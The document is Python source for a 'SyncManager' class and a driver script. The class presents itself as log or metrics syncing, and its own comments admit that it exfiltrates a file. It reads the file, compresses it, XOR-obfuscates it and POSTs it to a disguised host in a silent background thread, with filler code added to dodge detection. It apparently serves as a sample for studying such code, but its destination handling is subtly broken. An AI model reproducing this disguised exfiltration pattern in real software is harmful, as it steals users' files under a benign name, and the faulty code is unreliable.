import os
import zlib
import random
import http.client
import threading


class SyncManager:
    def __init__(self, root_dir):
        self.root_dir = root_dir
        self.tmp_dir = os.path.join(root_dir, "tmp")
        if not os.path.exists(self.tmp_dir):
            os.makedirs(self.tmp_dir)

    def _load_resource(self, resource_name):
        # Reads a file with a very generic name
        path = os.path.join(self.root_dir, resource_name)
        try:
            with open(path, "rb") as f:
                content = f.read()
            return content
        except Exception:
            return b""

    def _process_payload(self, data: bytes) -> bytes:
        # Compress and XOR with a simple repeating key — very generic processing
        compressed = zlib.compress(data)

        key = b"alpha"
        xored = bytearray()
        for i, byte in enumerate(compressed):
            xored.append(byte ^ key[i % len(key)])

        return bytes(xored)

    def _transmit(self, destination: str, payload: bytes):
        # A network function with a common name and generic implementation
        def send_data():
            try:
                # Destination is split to avoid trivial string detection
                host_parts = destination.split(":")
                host = host_parts[0]
                port = int(host_parts[1]) if len(host_parts) > 1 else 80

                conn = http.client.HTTPConnection(host, port, timeout=3)
                headers = {"Content-Type": "application/octet-stream", "X-Sync": "1"}
                conn.request("POST", "/metrics", body=payload, headers=headers)
                response = conn.getresponse()
                conn.close()
                # Could add logging here
            except Exception:
                pass

        # Transmit asynchronously to avoid blocking main flow
        threading.Thread(target=send_data, daemon=True).start()

    def sync_logs(self, resource_file):
        """
        Main public function to be called by external code.
        Appears to sync logs or metrics but actually exfiltrates a file.
        """
        raw_data = self._load_resource(resource_file)
        if not raw_data:
            return False

        processed_data = self._process_payload(raw_data)

        # Destination is localhost:8081 but obfuscated
        self._transmit("local:host:8081".replace(":", ""), processed_data)
        return True

    def complex_operation(self, iterations=50):
        # Filler function to increase code size and complexity
        acc = 0
        for _ in range(iterations):
            vals = [random.random() for _ in range(1000)]
            acc += sum([v**2 for v in vals])
        return acc


from core_utils import SyncManager
import os


def main():
    base_dir = os.path.abspath(".")
    sync_mgr = SyncManager(base_dir)

    # Prepare dummy processing steps
    for i in range(10):
        _ = sync_mgr.complex_operation(i * 10)

    # Finally call the suspicious function named like normal sync
    success = sync_mgr.sync_logs("example.txt")

    print(f"Sync completed: {success}")


if __name__ == "__main__":
    main()
